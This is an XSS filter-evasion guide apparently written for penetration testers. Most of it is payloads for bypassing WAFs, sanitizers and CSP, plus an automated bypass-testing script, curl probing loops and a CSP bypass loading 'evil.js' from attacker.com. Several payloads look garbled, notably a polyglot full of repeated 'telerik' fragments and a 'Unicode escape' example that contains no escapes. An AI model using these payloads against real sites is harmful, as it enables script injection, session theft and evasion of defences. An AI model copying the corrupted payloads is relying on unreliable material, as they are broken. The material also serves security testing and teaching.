# XSS Filter Evasion Guide

> Techniques for bypassing Web Application Firewalls (WAFs), input filters, and Content Security Policies using encoding tricks, polyglot payloads, and context-aware evasion strategies.

## Introduction

XSS filter evasion is one of the most technically demanding skills in web application penetration testing. Modern web applications deploy layered defenses -- input validation, output encoding, WAF rules, CSP headers, and browser-level protections -- that collectively block naive XSS payloads. However, each defense layer operates on a specific HTML/JavaScript parser, and when parsers disagree on how to interpret the same string, evasion becomes possible.

This guide provides a systematic catalog of evasion techniques organized by strategy. Each technique includes working payloads, explanations of why they work, and guidance on when to apply them. The techniques range from simple encoding tricks to advanced parser differential exploits.

**When to Use This Guide**: Apply these techniques after confirming that (1) user input reaches the response, (2) the application applies some form of filtering or encoding, and (3) basic payloads like `<script>alert(1)</script>` are blocked. Start with encoding-based bypasses and progressively escalate to more complex techniques.

## 1. Encoding-Based Bypasses

WAFs often match literal strings. Encoding the payload defeats signature-based detection. The key insight is that browsers decode multiple encoding layers before executing the payload, so any encoding scheme the browser understands can be used to obfuscate the attack.

### HTML Entity Encoding

HTML entities use decimal (`&#97;`) or hex (`&#x61;`) code points to represent characters. Most WAFs do not decode HTML entities before pattern matching.

```html
<!-- Decimal HTML entities for 'alert(1)' -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>

<!-- Hex HTML entities for 'alert(1)' -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;1&#x29;>

<!-- Named entities where available -->
<a href="&javascript:alert(1)">click</a>
```

### URL Encoding and Double Encoding

URL encoding (`%XX`) is commonly used in query parameters. Some WAFs decode one layer but not two, making double encoding effective.

```html
<!-- Single URL encoding -->
<a href="javascript:%61lert(1)">click</a>

<!-- Double URL encoding (when WAF decodes once) -->
<a href="javascript:%2561lert(1)">click</a>

<!-- Mixed HTML + URL encoding -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

### Unicode and Hex Encoding in JavaScript Context

When the payload lands inside a JavaScript string or event handler, JavaScript-native encoding can bypass keyword filters.

```javascript
// Hex escape sequences in event handlers
<img src=x onerror=\x61\x6c\x65\x72\x74(1)>

// Unicode escape sequences
<img src=x onerror=alert(1)>

// Octal encoding (in some contexts)
<img src=x onerror=\141\154\145\162\164(1)>
```

### Base64 in Data URIs

Data URIs with base64 encoding completely hide the payload from pattern matching.

```html
<!-- Base64 in data URIs -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Data URI in iframe -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Data URI in embed tag -->
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Encoding Decision Table

| Filter Blocks | Encoding Strategy | Example Payload |
|---------------|-------------------|-----------------|
| `<script>` tag | HTML entity encode `<` | `&lt;script&gt;alert(1)&lt;/script&gt;` (works only if context re-decodes) |
| `alert` keyword | Hex escape in JS context | `\x61lert(1)` |
| `javascript:` URI | Mixed entity + URL encoding | `&#106;&#97;vascript:%61lert(1)` |
| Parentheses `()` | Template literals | `alert\`1\`` |
| Quotes `"'` | Backtick template literals | `` <img src=x onerror=alert`1`> `` |
| Multiple keywords | Base64 via data URI | `<object data="data:text/html;base64,...">` |

## 2. Case Manipulation and Null Bytes

```html
<!-- Mixed case to bypass case-sensitive filters -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Null bytes to break parser logic -->
<scr%00ipt>alert(1)</scr%00ipt>
<img src=x onerror="al\x00ert(1)">

<!-- Tab, newline, carriage return insertion -->
<img src=x onerror="a]l
e	r
t(1)">
<a href="j&#x09;avascript:alert(1)">click</a>
```

## 3. Tag and Attribute Obfuscation

When `<script>` tags and common event handlers are blocked, numerous alternative HTML elements and attributes can execute JavaScript. The key is to use elements that are less commonly filtered but still trigger script execution in all major browsers.

### Lesser-Known Event Handlers

Most WAFs block `onerror`, `onload`, and `onclick`. These alternatives are often unfiltered:

```html
<!-- Interactive element events -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>
<style onload=alert(1)>

<!-- Animation events -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x>

<!-- Drag and drop events -->
<div ondrag=alert(1) draggable=true>drag me</div>
<div ondrop=alert(1) ondragover=event.preventDefault()>drop here</div>

<!-- Focus events on non-input elements -->
<div onfocusin=alert(1) tabindex=0 autofocus>
<select onfocus=alert(1) autofocus>

<!-- Clipboard and input events -->
<textarea oncopy=alert(1)>copy me</textarea>
<input oncut=alert(1) value="cut me">
<div onpaste=alert(1) contenteditable>paste here</div>
```

### SVG and MathML Deep Nesting

SVG and MathML create alternative namespace contexts that confuse HTML filters. The browser's parser switches between HTML, SVG, and MathML namespaces, creating opportunities for parser differential exploitation.

```html
<!-- SVG namespace with script execution -->
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributename=x>

<!-- Deep namespace nesting (bypasses many sanitizers) -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>

<!-- SVG foreignObject breaks out of SVG context -->
<svg><foreignObject><body onload=alert(1)>

<!-- SVG use element for external resource loading -->
<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"> -->
```

### CSS-Based Execution Vectors

Although modern browsers have deprecated CSS expressions, some legacy contexts still support CSS-driven script execution:

```html
<!-- CSS import with JavaScript (legacy IE) -->
<style>@import 'javascript:alert(1)';</style>

<!-- CSS background with JavaScript URI (legacy) -->
<div style="background:url('javascript:alert(1)')">

<!-- link rel=import (Chrome, deprecated but may work on older versions) -->
<link rel=import href="data:text/html,<script>alert(1)</script>">
```

```html
<!-- Lesser-known event handlers -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>
<style onload=alert(1)>

<!-- SVG-based payloads (often bypass HTML filters) -->
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributename=x>
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>

<!-- Using data attributes and CSS -->
<div style="background:url('javascript:alert(1)')">
<link rel=import href="data:text/html,<script>alert(1)</script>">
```

## 4. WAF-Specific Bypass Techniques

```bash
# Identify WAF vendor first
wafw00f https://target.com

# Common WAF bypass patterns by vendor:

# Cloudflare bypass attempts
<svg/onload=alert(1)>
<svg onload=prompt%26%230000000040document.domain)>
<a"/telerik:alert(1)>click

# ModSecurity CRS bypass
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="top[/al/.source+/ert/.source](1)">
<img src=x onerror="self['\x61lert'](1)">

# AWS WAF bypass
<img src=x onerror=alert(1)//
<svg><script>alert&lpar;1&rpar;</script>
```

```python
# Automated WAF bypass testing with Python
import requests
import urllib.parse

payloads = [
    '<svg onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<details/open/ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>',
]

encodings = [
    lambda p: p,                                    # Plain
    lambda p: urllib.parse.quote(p),                # URL encode
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),  # Double URL encode
    lambda p: p.replace(' ', '/**/'),               # Comment insertion
    lambda p: p.replace('alert', 'al\\x65rt'),      # Hex escape
]

target = 'https://target.com/search?q='
for payload in payloads:
    for encode in encodings:
        encoded = encode(payload)
        r = requests.get(target + encoded, timeout=5)
        if r.status_code != 403 and 'blocked' not in r.text.lower():
            print(f'[BYPASS] {encoded[:80]}... Status: {r.status_code}')
```

## 5. JavaScript Execution Without Parentheses

```javascript
// When parentheses are filtered
// Using template literals (backticks)
alert`1`

// Using throw with onerror
<img src=x onerror="window.onerror=alert;throw 1">

// Using constructor and array destructuring
[].constructor.constructor('alert(1)')()

// Using Proxy
<img src=x onerror="new Proxy({},{get:(_,x)=>this[x]}).alert(1)">

// Using valueOf/toString override
<img src=x onerror="{toString:alert}+''">

// Without alert keyword at all
<img src=x onerror="self['\\x61\\x6c\\x65\\x72\\x74'](document.domain)">
<img src=x onerror="top[8680439..toString(30)](1)">
```

## 6. CSP Bypass Techniques

```html
<!-- Bypass via allowed CDN (JSONP endpoints) -->
<!-- If script-src includes a CDN with JSONP: -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//">
</script>

<!-- Bypass via base tag hijacking (if base-uri not set) -->
<base href="https://attacker.com/">
<script src="/malicious.js"></script>

<!-- Bypass via Angular (if angular.js is allowed) -->
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

<!-- Bypass strict-dynamic with pre-existing script -->
<script nonce="known-nonce">
  const s = document.createElement('script');
  s.src = 'https://attacker.com/evil.js';
  document.body.appendChild(s);  // Inherits trust via strict-dynamic
</script>
```

```bash
# Enumerate CSP for weaknesses
# Use Google CSP Evaluator or csp-evaluator CLI
curl -sI https://target.com | grep -i content-security-policy

# Check for JSONP endpoints on whitelisted domains
# Common JSONP endpoints that enable CSP bypass:
# - accounts.google.com/o/oauth2/revoke?callback=
# - cdn.jsdelivr.net (hosts arbitrary JS)
# - cdnjs.cloudflare.com/ajax/libs/angular.js/
```

## 7. Polyglot Payloads

```javascript
// Universal polyglot - works in multiple contexts
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0telerik%telerik0telerik1telerik/telerik/telerik*telerik/telerik+/telerik+/telerik!telerik*telerik/telerik"telerik;telerik{telerik}telerik//telerik\telerik/telerik%telerik0telerik&telerik-telerik*/alert()//'>"><details/open/ontoggle=confirm()>

// Context-adaptive payloads
// Works in: HTML attribute, JS string, URL context
"onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%
'-alert(1)-'
</script><script>alert(1)</script>

// Minimal polyglot for testing
'">><marquee><img src=x onerror=alert(1)>

// SVG polyglot (bypasses many HTML sanitizers)
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```

## 8. Testing Methodology

A systematic approach to filter evasion is essential. Randomly trying payloads is inefficient and often misses viable bypasses. Follow this structured workflow:

### Step 1: Character Probe

Identify which characters and strings are filtered or blocked before attempting full payloads.

```bash
# Probe individual characters to map the filter surface
for char in '<' '>' '"' "'" '(' ')' '/' 'on' 'script' 'alert' 'javascript' 'data'; do
  response=$(curl -s "https://target.com/search?q=${char}")
  blocked=$(echo "$response" | grep -ci "blocked\|forbidden\|invalid\|error")
  reflected=$(echo "$response" | grep -c "${char}")
  echo "${char} -> reflected: ${reflected}, blocked: ${blocked}"
done
```

### Step 2: Context Analysis

Determine the output context of your injection point, as this dictates which bypass strategies are viable.

| Output Context | Required Payload Structure | Example |
|---------------|---------------------------|---------|
| Between HTML tags | Direct tag injection | `<script>alert(1)</script>` |
| Inside HTML attribute | Break out of attribute | `" onmouseover="alert(1)" "` |
| Inside JavaScript variable | Close the string and inject | `';alert(1);//` |
| Inside JavaScript event handler | Escape to raw JS | `\';alert(1);//` |
| Inside CSS context | CSS-based execution | `expression(alert(1))` |
| Inside URL (href/src) | JavaScript URI | `javascript:alert(1)` |

### Step 3: Automated Scanning

Use Dalfox or XSStrike for automated testing with built-in WAF evasion capabilities.

```bash
# Dalfox with WAF evasion mode
dalfox url "https://target.com/search?q=test" \
  --waf-evasion \
  --blind "https://your-callback.xss.ht" \
  --output results.json \
  --format json

# XSStrike with crawling and parameter mining
python xsstrike.py -u "https://target.com/page" --crawl --fuzzer
```

### Step 4: Manual Verification

Always confirm bypasses in a real browser. Some payloads work in curl output but fail in actual browser DOM parsing due to differences in how curl and browsers handle HTML.

## Hands-on Exercises

### Exercise 1: Encoding Ladder

**Objective**: Bypass a filter that blocks `<script>` and `alert()` keywords using progressively harder encoding techniques.

**Setup**: Use a local DVWA instance with XSS reflected mode set to "medium" or "high" difficulty.

1. Test: `<script>alert(1)</script>` -- observe the filter response
2. Try mixed case: `<ScRiPt>AlErT(1)</ScRiPt>` -- note if case normalization occurs
3. Switch to event handler: `<img src=x onerror=alert(1)>` -- note if `alert` is still blocked
4. Encode alert: `<img src=x onerror=\x61lert(1)>` -- hex encoding of the 'a'
5. Use constructor trick: `<img src=x onerror=[][constructor][constructor]('\x61lert(1)')()>`
6. Document each attempt and which specific filter rule it bypassed

### Exercise 2: WAF Fingerprinting and Bypass

**Objective**: Identify the WAF protecting a target and craft a targeted bypass.

**Setup**: Use a target with a known WAF (e.g., Cloudflare-protected site on bug bounty program).

1. Run `wafw00f https://target.com` to identify the WAF vendor
2. Research known bypasses for that specific WAF version
3. Test the `<svg/onload=alert(1)>` payload as a baseline
4. Iterate through vendor-specific bypass patterns from Section 4
5. Automate testing using the Python script from Section 4
6. Write a report documenting the WAF rule that was bypassed and the payload that succeeded

### Exercise 3: Polyglot Construction

**Objective**: Build a custom polyglot payload that works in at least 3 different output contexts.

1. Start with the universal polyglot from Section 7
2. Modify it to be specific to your target application
3. Test in HTML tag context, attribute context, and JavaScript string context
4. Measure the success rate across contexts
5. Optimize the payload length while maintaining multi-context functionality

## References

- **OWASP XSS Filter Evasion Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html -- The definitive reference for XSS bypass techniques with comprehensive examples.
- **PortSwigger XSS Cheat Sheet**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet -- Interactive cheat sheet organized by context and browser support.
- **HTML5 Security CheatSheet**: https://html5sec.org/ -- Community-maintained collection of HTML5-specific XSS vectors.
- **Mario Heiderich mXSS Research**: https://research.securitum.com/ -- Cutting-edge research on mutation XSS and sanitizer bypasses.
- **PortSwigger Web Security Academy - XSS**: https://portswigger.net/web-security/cross-site-scripting -- Structured labs covering reflected, stored, and DOM-based XSS with progressive difficulty.
- **Dalfox Documentation**: https://github.com/hahwul/dalfox -- High-performance XSS scanner with WAF evasion capabilities.
- **XSStrike Repository**: https://github.com/s0md3v/XSStrike -- Advanced XSS detection suite with fuzzing and crawler.
- **Bug Bounty Writeups**: https://hackerone.com/hacktivity -- Real-world XSS bypass examples from bug bounty reports.
- **Browser Security Handbook**: https://code.google.com/archive/p/browsersec/ -- Deep reference on browser security mechanisms and parser behavior.

```bash
# Systematic filter evasion workflow
# Step 1: Identify what's filtered
for char in '<' '>' '"' "'" '(' ')' '/' 'on' 'script' 'alert'; do
  response=$(curl -s "https://target.com/search?q=${char}" | grep -c "${char}")
  echo "${char} -> reflected: ${response}"
done

# Step 2: Test encoding acceptance
curl -s "https://target.com/search?q=%3Csvg%20onload%3Dalert(1)%3E" | \
  grep -i "svg\|blocked\|forbidden"

# Step 3: Use dalfox for automated testing
go install github.com/hahwul/dalfox/v2@latest
dalfox url "https://target.com/search?q=test" \
  --waf-evasion \
  --blind "https://your-callback.xss.ht" \
  --output results.json

# Step 4: Manual verification of bypasses
# Always confirm in a real browser - some payloads
# work in curl but not in browser DOM parsing
```
